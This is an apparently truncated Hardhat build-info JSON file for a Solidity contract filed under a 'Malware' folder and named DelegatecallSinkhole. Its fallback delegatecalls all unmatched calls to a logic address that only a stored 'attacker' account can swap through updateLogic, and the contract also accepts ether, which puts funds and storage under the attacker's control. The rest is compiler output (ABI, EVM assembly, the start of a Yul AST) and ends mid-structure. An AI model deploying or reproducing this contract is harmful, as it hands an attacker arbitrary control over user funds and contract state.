{
	"id": "d7202613b9d2800a24f8701867fb0325",
	"_format": "hh-sol-build-info-1",
	"solcVersion": "0.8.26",
	"solcLongVersion": "0.8.26+commit.8a97fa7a",
	"input": {
		"language": "Solidity",
		"sources": {
			"M/Malware/Delegatecall Sinkhole â€“ Swallows all logic via fallback delegatecall.sol": {
				"content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.21;\n\n/// @title DelegatecallSinkhole - Catches fallback and re-routes to attacker logic\ncontract DelegatecallSinkhole {\n    address public sinkLogic;\n    address public attacker;\n\n    constructor(address _logic, address _attacker) {\n        sinkLogic = _logic;\n        attacker = _attacker;\n    }\n\n    fallback() external payable {\n        assembly {\n            calldatacopy(0, 0, calldatasize())\n            let result := delegatecall(gas(), sload(sinkLogic.slot), 0, calldatasize(), 0, 0)\n            returndatacopy(0, 0, returndatasize())\n            switch result\n            case 0 {\n                revert(0, returndatasize())\n            }\n            default {\n                return(0, returndatasize())\n            }\n        }\n    }\n\n    function updateLogic(address newLogic) external {\n        require(msg.sender == attacker, \"Only attacker\");\n        sinkLogic = newLogic; // ðŸŒ€ re-routes fallback anywhere\n    }\n\n    receive() external payable {}\n}\n"
			}
		},
		"settings": {
			"optimizer": {
				"enabled": false,
				"runs": 200
			},
			"outputSelection": {
				"*": {
					"": [
						"ast"
					],
					"*": [
						"abi",
						"metadata",
						"devdoc",
						"userdoc",
						"storageLayout",
						"evm.legacyAssembly",
						"evm.bytecode",
						"evm.deployedBytecode",
						"evm.methodIdentifiers",
						"evm.gasEstimates",
						"evm.assembly"
					]
				}
			},
			"remappings": []
		}
	},
	"output": {
		"contracts": {
			"M/Malware/Delegatecall Sinkhole â€“ Swallows all logic via fallback delegatecall.sol": {
				"DelegatecallSinkhole": {
					"abi": [
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "_logic",
									"type": "address"
								},
								{
									"internalType": "address",
									"name": "_attacker",
									"type": "address"
								}
							],
							"stateMutability": "nonpayable",
							"type": "constructor"
						},
						{
							"stateMutability": "payable",
							"type": "fallback"
						},
						{
							"inputs": [],
							"name": "attacker",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "sinkLogic",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "newLogic",
									"type": "address"
								}
							],
							"name": "updateLogic",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"stateMutability": "payable",
							"type": "receive"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {},
						"title": "DelegatecallSinkhole - Catches fallback and re-routes to attacker logic",
						"version": 1
					},
					"evm": {
						"assembly": "    /* \"M/Malware/Delegatecall Sinkhole \\xe2\\x80\\x93 Swallows all logic via fallback delegatecall.sol\":141:1018  contract DelegatecallSinkhole {... */\n  mstore(0x40, 0x80)\n    /* \"M/Malware/Delegatecall Sinkhole \\xe2\\x80\\x93 Swallows all logic via fallback delegatecall.sol\":237:349  constructor(address _logic, address _attacker) {... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  dup2\n  add\n  swap1\n  tag_2\n  swap2\n  swap1\n  tag_3\n  jump\t// in\ntag_2:\n    /* \"M/Malware/Delegatecall Sinkhole \\xe2\\x80\\x93 Swallows all logic via fallback delegatecall.sol\":306:312  _logic */\n  dup2\n    /* \"M/Malware/Delegatecall Sinkhole \\xe2\\x80\\x93 Swallows all logic via fallback delegatecall.sol\":294:303  sinkLogic */\n  0x00\n  dup1\n    /* \"M/Malware/Delegatecall Sinkhole \\xe2\\x80\\x93 Swallows all logic via fallback delegatecall.sol\":294:312  sinkLogic = _logic */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"M/Malware/Delegatecall Sinkhole \\xe2\\x80\\x93 Swallows all logic via fallback delegatecall.sol\":333:342  _attacker */\n  dup1\n    /* \"M/Malware/Delegatecall Sinkhole \\xe2\\x80\\x93 Swallows all logic via fallback delegatecall.sol\":322:330  attacker */\n  0x01\n  0x00\n    /* \"M/Malware/Delegatecall Sinkhole \\xe2\\x80\\x93 Swallows all logic via fallback delegatecall.sol\":322:342  attacker = _attacker */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"M/Malware/Delegatecall Sinkhole \\xe2\\x80\\x93 Swallows all logic via fallback delegatecall.sol\":237:349  constructor(address _logic, address _attacker) {... */\n  pop\n  pop\n    /* \"M/Malware/Delegatecall Sinkhole \\xe2\\x80\\x93 Swallows all logic via fallback delegatecall.sol\":141:1018  contract DelegatecallSinkhole {... */\n  jump(tag_6)\n    /* \"#utility.yul\":88:205   */\ntag_8:\n    /* \"#utility.yul\":197:198   */\n  0x00\n    /* \"#utility.yul\":194:195   */\n  dup1\n    /* \"#utility.yul\":187:199   */\n  revert\n    /* \"#utility.yul\":334:460   */\ntag_10:\n    /* \"#utility.yul\":371:378   */\n  0x00\n    /* \"#utility.yul\":411:453   */\n  0xffffffffffffffffffffffffffffffffffffffff\n    /* \"#utility.yul\":404:409   */\n  dup3\n    /* \"#utility.yul\":400:454   */\n  and\n    /* \"#utility.yul\":389:454   */\n  swap1\n  pop\n    /* \"#utility.yul\":334:460   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":466:562   */\ntag_11:\n    /* \"#utility.yul\":503:510   */\n  0x00\n    /* \"#utility.yul\":532:556   */\n  tag_20\n    /* \"#utility.yul\":550:555   */\n  dup3\n    /* \"#utility.yul\":532:556   */\n  tag_10\n  jump\t// in\ntag_20:\n    /* \"#utility.yul\":521:556   */\n  swap1\n  pop\n    /* \"#utility.yul\":466:562   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":568:690   */\ntag_12:\n    /* \"#utility.yul\":641:665   */\n  tag_22\n    /* \"#utility.yul\":659:664   */\n  dup2\n    /* \"#utility.yul\":641:665   */\n  tag_11\n  jump\t// in\ntag_22:\n    /* \"#utility.yul\":634:639   */\n  dup2\n    /* \"#utility.yul\":631:666   */\n  eq\n    /* \"#utility.yul\":621:684   */\n  tag_23\n  jumpi\n    /* \"#utility.yul\":680:681   */\n  0x00\n    /* \"#utility.yul\":677:678   */\n  dup1\n    /* \"#utility.yul\":670:682   */\n  revert\n    /* \"#utility.yul\":621:684   */\ntag_23:\n    /* \"#utility.yul\":568:690   */\n  pop\n  jump\t// out\n    /* \"#utility.yul\":696:839   */\ntag_13:\n    /* \"#utility.yul\":753:758   */\n  0x00\n    /* \"#utility.yul\":784:790   */\n  dup2\n    /* \"#utility.yul\":778:791   */\n  mload\n    /* \"#utility.yul\":769:791   */\n  swap1\n  pop\n    /* \"#utility.yul\":800:833   */\n  tag_25\n    /* \"#utility.yul\":827:832   */\n  dup2\n    /* \"#utility.yul\":800:833   */\n  tag_12\n  jump\t// in\ntag_25:\n    /* \"#utility.yul\":696:839   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":845:1352   */\ntag_3:\n    /* \"#utility.yul\":924:930   */\n  0x00\n    /* \"#utility.yul\":932:938   */\n  dup1\n    /* \"#utility.yul\":981:983   */\n  0x40\n    /* \"#utility.yul\":969:978   */\n  dup4\n    /* \"#utility.yul\":960:967   */\n  dup6\n    /* \"#utility.yul\":956:979   */\n  sub\n    /* \"#utility.yul\":952:984   */\n  slt\n    /* \"#utility.yul\":949:1068   */\n  iszero\n  tag_27\n  jumpi\n    /* \"#utility.yul\":987:1066   */\n  tag_28\n  tag_8\n  jump\t// in\ntag_28:\n    /* \"#utility.yul\":949:1068   */\ntag_27:\n    /* \"#utility.yul\":1107:1108   */\n  0x00\n    /* \"#utility.yul\":1132:1196   */\n  tag_29\n    /* \"#utility.yul\":1188:1195   */\n  dup6\n    /* \"#utility.yul\":1179:1185   */\n  dup3\n    /* \"#utility.yul\":1168:1177   */\n  dup7\n    /* \"#utility.yul\":1164:1186   */\n  add\n    /* \"#utility.yul\":1132:1196   */\n  tag_13\n  jump\t// in\ntag_29:\n    /* \"#utility.yul\":1122:1196   */\n  swap3\n  pop\n    /* \"#utility.yul\":1078:1206   */\n  pop\n    /* \"#utility.yul\":1245:1247   */\n  0x20\n    /* \"#utility.yul\":1271:1335   */\n  tag_30\n    /* \"#utility.yul\":1327:1334   */\n  dup6\n    /* \"#utility.yul\":1318:1324   */\n  dup3\n    /* \"#utility.yul\":1307:1316   */\n  dup7\n    /* \"#utility.yul\":1303:1325   */\n  add\n    /* \"#utility.yul\":1271:1335   */\n  tag_13\n  jump\t// in\ntag_30:\n    /* \"#utility.yul\":1261:1335   */\n  swap2\n  pop\n    /* \"#utility.yul\":1216:1345   */\n  pop\n    /* \"#utility.yul\":845:1352   */\n  swap3\n  pop\n  swap3\n  swap1\n  pop\n  jump\t// out\n    /* \"M/Malware/Delegatecall Sinkhole \\xe2\\x80\\x93 Swallows all logic via fallback delegatecall.sol\":141:1018  contract DelegatecallSinkhole {... */\ntag_6:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"M/Malware/Delegatecall Sinkhole \\xe2\\x80\\x93 Swallows all logic via fallback delegatecall.sol\":141:1018  contract DelegatecallSinkhole {... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x48eb76ee\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x795e617e\n      eq\n      tag_4\n      jumpi\n      dup1\n      0xe062bb05\n      eq\n      tag_5\n      jumpi\n      jump(tag_2)\n    tag_1:\n      jumpi(tag_2, calldatasize)\n      stop\n    tag_2:\n        /* \"M/Malware/Delegatecall Sinkhole \\xe2\\x80\\x93 Swallows all logic via fallback delegatecall.sol\":435:449  calldatasize() */\n      calldatasize\n        /* \"M/Malware/Delegatecall Sinkhole \\xe2\\x80\\x93 Swallows all logic via fallback delegatecall.sol\":432:433  0 */\n      0x00\n        /* \"M/Malware/Delegatecall Sinkhole \\xe2\\x80\\x93 Swallows all logic via fallback delegatecall.sol\":429:430  0 */\n      dup1\n        /* \"M/Malware/Delegatecall Sinkhole \\xe2\\x80\\x93 Swallows all logic via fallback delegatecall.sol\":416:450  calldatacopy(0, 0, calldatasize()) */\n      calldatacopy\n        /* \"M/Malware/Delegatecall Sinkhole \\xe2\\x80\\x93 Swallows all logic via fallback delegatecall.sol\":542:543  0 */\n      0x00\n        /* \"M/Malware/Delegatecall Sinkhole \\xe2\\x80\\x93 Swallows all logic via fallback delegatecall.sol\":539:540  0 */\n      dup1\n        /* \"M/Malware/Delegatecall Sinkhole \\xe2\\x80\\x93 Swallows all logic via fallback delegatecall.sol\":523:537  calldatasize() */\n      calldatasize\n        /* \"M/Malware/Delegatecall Sinkhole \\xe2\\x80\\x93 Swallows all logic via fallback delegatecall.sol\":520:521  0 */\n      0x00\n        /* \"M/Malware/Delegatecall Sinkhole \\xe2\\x80\\x93 Swallows all logic via fallback delegatecall.sol\":503:517  sinkLogic.slot */\n      dup1\n        /* \"M/Malware/Delegatecall Sinkhole \\xe2\\x80\\x93 Swallows all logic via fallback delegatecall.sol\":497:518  sload(sinkLogic.slot) */\n      sload\n        /* \"M/Malware/Delegatecall Sinkhole \\xe2\\x80\\x93 Swallows all logic via fallback delegatecall.sol\":490:495  gas() */\n      gas\n        /* \"M/Malware/Delegatecall Sinkhole \\xe2\\x80\\x93 Swallows all logic via fallback delegatecall.sol\":477:544  delegatecall(gas(), sload(sinkLogic.slot), 0, calldatasize(), 0, 0) */\n      delegatecall\n        /* \"M/Malware/Delegatecall Sinkhole \\xe2\\x80\\x93 Swallows all logic via fallback delegatecall.sol\":578:594  returndatasize() */\n      returndatasize\n        /* \"M/Malware/Delegatecall Sinkhole \\xe2\\x80\\x93 Swallows all logic via fallback delegatecall.sol\":575:576  0 */\n      0x00\n        /* \"M/Malware/Delegatecall Sinkhole \\xe2\\x80\\x93 Swallows all logic via fallback delegatecall.sol\":572:573  0 */\n      dup1\n        /* \"M/Malware/Delegatecall Sinkhole \\xe2\\x80\\x93 Swallows all logic via fallback delegatecall.sol\":557:595  returndatacopy(0, 0, returndatasize()) */\n      returndatacopy\n        /* \"M/Malware/Delegatecall Sinkhole \\xe2\\x80\\x93 Swallows all logic via fallback delegatecall.sol\":615:621  result */\n      dup1\n        /* \"M/Malware/Delegatecall Sinkhole \\xe2\\x80\\x93 Swallows all logic via fallback delegatecall.sol\":639:640  0 */\n      0x00\n        /* \"M/Malware/Delegatecall Sinkhole \\xe2\\x80\\x93 Swallows all logic via fallback delegatecall.sol\":634:700  case 0 {... */\n      dup2\n      eq\n      tag_11\n      jumpi\n        /* \"M/Malware/Delegatecall Sinkhole \\xe2\\x80\\x93 Swallows all logic via fallback delegatecall.sol\":749:765  returndatasize() */\n      returndatasize\n        /* \"M/Malware/Delegatecall Sinkhole \\xe2\\x80\\x93 Swallows all logic via fallback delegatecall.sol\":746:747  0 */\n      0x00\n        /* \"M/Malware/Delegatecall Sinkhole \\xe2\\x80\\x93 Swallows all logic via fallback delegatecall.sol\":739:766  return(0, returndatasize()) */\n      return\n        /* \"M/Malware/Delegatecall Sinkhole \\xe2\\x80\\x93 Swallows all logic via fallback delegatecall.sol\":634:700  case 0 {... */\n    tag_11:\n        /* \"M/Malware/Delegatecall Sinkhole \\xe2\\x80\\x93 Swallows all logic via fallback delegatecall.sol\":669:685  returndatasize() */\n      returndatasize\n        /* \"M/Malware/Delegatecall Sinkhole \\xe2\\x80\\x93 Swallows all logic via fallback delegatecall.sol\":666:667  0 */\n      0x00\n        /* \"M/Malware/Delegatecall Sinkhole \\xe2\\x80\\x93 Swallows all logic via fallback delegatecall.sol\":659:686  revert(0, returndatasize()) */\n      revert\n        /* \"M/Malware/Delegatecall Sinkhole \\xe2\\x80\\x93 Swallows all logic via fallback delegatecall.sol\":207:230  address public attacker */\n    tag_3:\n      callvalue\n      dup1\n      iszero\n      tag_12\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_12:\n      pop\n      tag_13\n      tag_14\n      jump\t// in\n    tag_13:\n      mload(0x40)\n      tag_15\n      swap2\n      swap1\n      tag_16\n      jump\t// in\n    tag_15:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"M/Malware/Delegatecall Sinkhole \\xe2\\x80\\x93 Swallows all logic via fallback delegatecall.sol\":802:981  function updateLogic(address newLogic) external {... */\n    tag_4:\n      callvalue\n      dup1\n      iszero\n      tag_17\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_17:\n      pop\n      tag_18\n      0x04\n      dup1\n      calldatasize\n      sub\n      dup2\n      add\n      swap1\n      tag_19\n      swap2\n      swap1\n      tag_20\n      jump\t// in\n    tag_19:\n      tag_21\n      jump\t// in\n    tag_18:\n      stop\n        /* \"M/Malware/Delegatecall Sinkhole \\xe2\\x80\\x93 Swallows all logic via fallback delegatecall.sol\":177:201  address public sinkLogic */\n    tag_5:\n      callvalue\n      dup1\n      iszero\n      tag_22\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_22:\n      pop\n      tag_23\n      tag_24\n      jump\t// in\n    tag_23:\n      mload(0x40)\n      tag_25\n      swap2\n      swap1\n      tag_16\n      jump\t// in\n    tag_25:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"M/Malware/Delegatecall Sinkhole \\xe2\\x80\\x93 Swallows all logic via fallback delegatecall.sol\":207:230  address public attacker */\n    tag_14:\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"M/Malware/Delegatecall Sinkhole \\xe2\\x80\\x93 Swallows all logic via fallback delegatecall.sol\":802:981  function updateLogic(address newLogic) external {... */\n    tag_21:\n        /* \"M/Malware/Delegatecall Sinkhole \\xe2\\x80\\x93 Swallows all logic via fallback delegatecall.sol\":882:890  attacker */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"M/Malware/Delegatecall Sinkhole \\xe2\\x80\\x93 Swallows all logic via fallback delegatecall.sol\":868:890  msg.sender == attacker */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"M/Malware/Delegatecall Sinkhole \\xe2\\x80\\x93 Swallows all logic via fallback delegatecall.sol\":868:878  msg.sender */\n      caller\n        /* \"M/Malware/Delegatecall Sinkhole \\xe2\\x80\\x93 Swallows all logic via fallback delegatecall.sol\":868:890  msg.sender == attacker */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n        /* \"M/Malware/Delegatecall Sinkhole \\xe2\\x80\\x93 Swallows all logic via fallback delegatecall.sol\":860:908  require(msg.sender == attacker, \"Only attacker\") */\n      tag_27\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_28\n      swap1\n      tag_29\n      jump\t// in\n    tag_28:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_27:\n        /* \"M/Malware/Delegatecall Sinkhole \\xe2\\x80\\x93 Swallows all logic via fallback delegatecall.sol\":930:938  newLogic */\n      dup1\n        /* \"M/Malware/Delegatecall Sinkhole \\xe2\\x80\\x93 Swallows all logic via fallback delegatecall.sol\":918:927  sinkLogic */\n      0x00\n      dup1\n        /* \"M/Malware/Delegatecall Sinkhole \\xe2\\x80\\x93 Swallows all logic via fallback delegatecall.sol\":918:938  sinkLogic = newLogic */\n      0x0100\n      exp\n      dup2\n      sload\n      dup2\n      0xffffffffffffffffffffffffffffffffffffffff\n      mul\n      not\n      and\n      swap1\n      dup4\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      mul\n      or\n      swap1\n      sstore\n      pop\n        /* \"M/Malware/Delegatecall Sinkhole \\xe2\\x80\\x93 Swallows all logic via fallback delegatecall.sol\":802:981  function updateLogic(address newLogic) external {... */\n      pop\n      jump\t// out\n        /* \"M/Malware/Delegatecall Sinkhole \\xe2\\x80\\x93 Swallows all logic via fallback delegatecall.sol\":177:201  address public sinkLogic */\n    tag_24:\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"#utility.yul\":7:133   */\n    tag_30:\n        /* \"#utility.yul\":44:51   */\n      0x00\n        /* \"#utility.yul\":84:126   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":77:82   */\n      dup3\n        /* \"#utility.yul\":73:127   */\n      and\n        /* \"#utility.yul\":62:127   */\n      swap1\n      pop\n        /* \"#utility.yul\":7:133   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":139:235   */\n    tag_31:\n        /* \"#utility.yul\":176:183   */\n      0x00\n        /* \"#utility.yul\":205:229   */\n      tag_44\n        /* \"#utility.yul\":223:228   */\n      dup3\n        /* \"#utility.yul\":205:229   */\n      tag_30\n      jump\t// in\n    tag_44:\n        /* \"#utility.yul\":194:229   */\n      swap1\n      pop\n        /* \"#utility.yul\":139:235   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":241:359   */\n    tag_32:\n        /* \"#utility.yul\":328:352   */\n      tag_46\n        /* \"#utility.yul\":346:351   */\n      dup2\n        /* \"#utility.yul\":328:352   */\n      tag_31\n      jump\t// in\n    tag_46:\n        /* \"#utility.yul\":323:326   */\n      dup3\n        /* \"#utility.yul\":316:353   */\n      mstore\n        /* \"#utility.yul\":241:359   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":365:587   */\n    tag_16:\n        /* \"#utility.yul\":458:462   */\n      0x00\n        /* \"#utility.yul\":496:498   */\n      0x20\n        /* \"#utility.yul\":485:494   */\n      dup3\n        /* \"#utility.yul\":481:499   */\n      add\n        /* \"#utility.yul\":473:499   */\n      swap1\n      pop\n        /* \"#utility.yul\":509:580   */\n      tag_48\n        /* \"#utility.yul\":577:578   */\n      0x00\n        /* \"#utility.yul\":566:575   */\n      dup4\n        /* \"#utility.yul\":562:579   */\n      add\n        /* \"#utility.yul\":553:559   */\n      dup5\n        /* \"#utility.yul\":509:580   */\n      tag_32\n      jump\t// in\n    tag_48:\n        /* \"#utility.yul\":365:587   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":674:791   */\n    tag_34:\n        /* \"#utility.yul\":783:784   */\n      0x00\n        /* \"#utility.yul\":780:781   */\n      dup1\n        /* \"#utility.yul\":773:785   */\n      revert\n        /* \"#utility.yul\":920:1042   */\n    tag_36:\n        /* \"#utility.yul\":993:1017   */\n      tag_53\n        /* \"#utility.yul\":1011:1016   */\n      dup2\n        /* \"#utility.yul\":993:1017   */\n      tag_31\n      jump\t// in\n    tag_53:\n        /* \"#utility.yul\":986:991   */\n      dup2\n        /* \"#utility.yul\":983:1018   */\n      eq\n        /* \"#utility.yul\":973:1036   */\n      tag_54\n      jumpi\n        /* \"#utility.yul\":1032:1033   */\n      0x00\n        /* \"#utility.yul\":1029:1030   */\n      dup1\n        /* \"#utility.yul\":1022:1034   */\n      revert\n        /* \"#utility.yul\":973:1036   */\n    tag_54:\n        /* \"#utility.yul\":920:1042   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1048:1187   */\n    tag_37:\n        /* \"#utility.yul\":1094:1099   */\n      0x00\n        /* \"#utility.yul\":1132:1138   */\n      dup2\n        /* \"#utility.yul\":1119:1139   */\n      calldataload\n        /* \"#utility.yul\":1110:1139   */\n      swap1\n      pop\n        /* \"#utility.yul\":1148:1181   */\n      tag_56\n        /* \"#utility.yul\":1175:1180   */\n      dup2\n        /* \"#utility.yul\":1148:1181   */\n      tag_36\n      jump\t// in\n    tag_56:\n        /* \"#utility.yul\":1048:1187   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1193:1522   */\n    tag_20:\n        /* \"#utility.yul\":1252:1258   */\n      0x00\n        /* \"#utility.yul\":1301:1303   */\n      0x20\n        /* \"#utility.yul\":1289:1298   */\n      dup3\n        /* \"#utility.yul\":1280:1287   */\n      dup5\n        /* \"#utility.yul\":1276:1299   */\n      sub\n        /* \"#utility.yul\":1272:1304   */\n      slt\n        /* \"#utility.yul\":1269:1388   */\n      iszero\n      tag_58\n      jumpi\n        /* \"#utility.yul\":1307:1386   */\n      tag_59\n      tag_34\n      jump\t// in\n    tag_59:\n        /* \"#utility.yul\":1269:1388   */\n    tag_58:\n        /* \"#utility.yul\":1427:1428   */\n      0x00\n        /* \"#utility.yul\":1452:1505   */\n      tag_60\n        /* \"#utility.yul\":1497:1504   */\n      dup5\n        /* \"#utility.yul\":1488:1494   */\n      dup3\n        /* \"#utility.yul\":1477:1486   */\n      dup6\n        /* \"#utility.yul\":1473:1495   */\n      add\n        /* \"#utility.yul\":1452:1505   */\n      tag_37\n      jump\t// in\n    tag_60:\n        /* \"#utility.yul\":1442:1505   */\n      swap2\n      pop\n        /* \"#utility.yul\":1398:1515   */\n      pop\n        /* \"#utility.yul\":1193:1522   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1528:1697   */\n    tag_38:\n        /* \"#utility.yul\":1612:1623   */\n      0x00\n        /* \"#utility.yul\":1646:1652   */\n      dup3\n        /* \"#utility.yul\":1641:1644   */\n      dup3\n        /* \"#utility.yul\":1634:1653   */\n      mstore\n        /* \"#utility.yul\":1686:1690   */\n      0x20\n        /* \"#utility.yul\":1681:1684   */\n      dup3\n        /* \"#utility.yul\":1677:1691   */\n      add\n        /* \"#utility.yul\":1662:1691   */\n      swap1\n      pop\n        /* \"#utility.yul\":1528:1697   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1703:1866   */\n    tag_39:\n        /* \"#utility.yul\":1843:1858   */\n      0x4f6e6c792061747461636b657200000000000000000000000000000000000000\n        /* \"#utility.yul\":1839:1840   */\n      0x00\n        /* \"#utility.yul\":1831:1837   */\n      dup3\n        /* \"#utility.yul\":1827:1841   */\n      add\n        /* \"#utility.yul\":1820:1859   */\n      mstore\n        /* \"#utility.yul\":1703:1866   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1872:2238   */\n    tag_40:\n        /* \"#utility.yul\":2014:2017   */\n      0x00\n        /* \"#utility.yul\":2035:2102   */\n      tag_64\n        /* \"#utility.yul\":2099:2101   */\n      0x0d\n        /* \"#utility.yul\":2094:2097   */\n      dup4\n        /* \"#utility.yul\":2035:2102   */\n      tag_38\n      jump\t// in\n    tag_64:\n        /* \"#utility.yul\":2028:2102   */\n      swap2\n      pop\n        /* \"#utility.yul\":2111:2204   */\n      tag_65\n        /* \"#utility.yul\":2200:2203   */\n      dup3\n        /* \"#utility.yul\":2111:2204   */\n      tag_39\n      jump\t// in\n    tag_65:\n        /* \"#utility.yul\":2229:2231   */\n      0x20\n        /* \"#utility.yul\":2224:2227   */\n      dup3\n        /* \"#utility.yul\":2220:2232   */\n      add\n        /* \"#utility.yul\":2213:2232   */\n      swap1\n      pop\n        /* \"#utility.yul\":1872:2238   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2244:2663   */\n    tag_29:\n        /* \"#utility.yul\":2410:2414   */\n      0x00\n        /* \"#utility.yul\":2448:2450   */\n      0x20\n        /* \"#utility.yul\":2437:2446   */\n      dup3\n        /* \"#utility.yul\":2433:2451   */\n      add\n        /* \"#utility.yul\":2425:2451   */\n      swap1\n      pop\n        /* \"#utility.yul\":2497:2506   */\n      dup2\n        /* \"#utility.yul\":2491:2495   */\n      dup2\n        /* \"#utility.yul\":2487:2507   */\n      sub\n        /* \"#utility.yul\":2483:2484   */\n      0x00\n        /* \"#utility.yul\":2472:2481   */\n      dup4\n        /* \"#utility.yul\":2468:2485   */\n      add\n        /* \"#utility.yul\":2461:2508   */\n      mstore\n        /* \"#utility.yul\":2525:2656   */\n      tag_67\n        /* \"#utility.yul\":2651:2655   */\n      dup2\n        /* \"#utility.yul\":2525:2656   */\n      tag_40\n      jump\t// in\n    tag_67:\n        /* \"#utility.yul\":2517:2656   */\n      swap1\n      pop\n        /* \"#utility.yul\":2244:2663   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220a34ae33db78f9eebfec9ad10c82be4b74ab10a52c5040f7ca54dde6791ca1c5264736f6c634300081a0033\n}\n",
						"bytecode": {
							"functionDebugData": {
								"@_22": {
									"entryPoint": null,
									"id": 22,
									"parameterSlots": 2,
									"returnSlots": 0
								},
								"abi_decode_t_address_fromMemory": {
									"entryPoint": 257,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_decode_tuple_t_addresst_address_fromMemory": {
									"entryPoint": 277,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 2
								},
								"allocate_unbounded": {
									"entryPoint": null,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 1
								},
								"cleanup_t_address": {
									"entryPoint": 218,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"cleanup_t_uint160": {
									"entryPoint": 187,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db": {
									"entryPoint": null,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b": {
									"entryPoint": 183,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"validator_revert_t_address": {
									"entryPoint": 235,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 0
								}
							},
							"generatedSources": [
								{
									"ast": {
										"nativeSrc": "0:1355:1",
										"nodeType": "YulBlock",
										"src": "0:1355:1",
										"statements": [
											{
												"body": {
													"nativeSrc": "47:35:1",
													"nodeType": "YulBlock",
													"src": "47:35:1",
													"statements": [
														{
															"nativeSrc": "57:19:1",
															"nodeType": "YulAssignment",
															"src": "57:19:1",
															"value": {
																"arguments": [
																	{
																		"kind": "number",
																		"nativeSrc": "73:2:1",
																		"nodeType": "YulLiteral",
																		"src": "73:2:1",
																		"type": "",
																		"value": "64"
																	}
																],
																"functionName": {
																	"name": "mload",
																	"nativeSrc": "67:5:1",
																	"nodeType": "YulIdentifier",
																	"src": "67:5:1"
																},
																"nativeSrc": "67:9:1",
																"nodeType": "YulFunctionCall",
																"src": "67:9:1"
															},
															"variableNames": [
																{
																	"name": "memPtr",
																	"nativeSrc": "57:6:1",
																	"nodeType": "YulIdentifier",
																	"src": "57:6:1"
